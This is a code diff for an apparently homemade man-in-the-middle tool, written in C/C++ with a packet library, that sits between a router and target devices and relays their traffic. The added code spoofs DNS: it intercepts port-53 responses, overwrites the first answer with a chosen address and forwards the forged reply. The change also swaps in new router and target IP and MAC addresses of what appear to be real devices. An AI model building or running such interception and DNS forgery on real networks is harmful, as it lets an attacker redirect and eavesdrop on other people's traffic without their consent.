@@ -9,7 +9,7 @@
 
 
 const char* dev = "wlan1";
-const char* myip = "192.168.1.3";
+const char* myip = "192.168.179.8";
 
 struct host{
 	char ip[32];
@@ -18,14 +18,23 @@ struct host{
 
 
 /* nad11 mobile router */
-struct host router = {"192.168.1.1", "90:03:b7:90:e1:62"};
+struct host router = {"192.168.179.1", "a2:12:42:17:d8:8f"};
+
+/* buffalo router */
+//struct host router = {"192.168.222.1", "74:03:bd:13:2c:a6"};
+
+/* kaplan router */
+//struct host router = {"10.128.4.1", "00:00:0c:07:ac:01"};
 
 /* iphone */
-struct host target = {"192.168.1.4", "f0:24:75:bf:8d:bf"};
+//struct host target = {"192.168.179.2", "f0:24:75:bf:8d:bf"};
+
+/* buffalo usb ethernetl */
+//struct host target = {"192.168.222.103", "cc:e1:d5:02:ea:71"};
 
 /* mac wlan en0 */
 //struct host target = {"192.168.222.106", "10.128.5.85"};
-//struct host target = {"192.168.179.4", "80:e6:50:17:18:46"};
+struct host target = {"192.168.179.4", "80:e6:50:17:18:46"};
 
 
 
@@ -33,15 +42,6 @@ pgen_t* handle;
 void mitm_attack(const char* ip1, const char* mac1, 
 					const char* ip2, const char* mac2);
 bool other_packet_filter(const u_char* packet, int len);
-
-
-void filter(const u_char* packet, int len){
-	pgen_unknown buf(packet, len);
-	if(buf.isUDP && buf.portis(5556)){
-		pgen_ardrone pack(packet, len);
-		pack.DSUMMARY();
-	}
-}
 
 
 
@@ -62,8 +62,22 @@ bool myswitch(const u_char* packet, int len){
 	else						next_dst = router.mac;
 	ip.ETH.src = next_src;
 	ip.ETH.dst = next_dst;
-	
-	filter(packet, len);
+
+	ip.compile();
+	pgen_unknown buf(ip.data, len);
+
+	if(buf.isUDP){
+		if(buf.portis(53)){
+			pgen_dns dns(ip.data, len);
+			if(dns.DNS.flags.qr == 1){
+				memcpy(dns.DNS.answer[0].data, _s_data, 4);
+				dns.summary();
+				
+				dns.send_handle(handle);
+				return true;
+			}
+		}
+	}
 
 	ip.send_handle(handle);
 	return true;
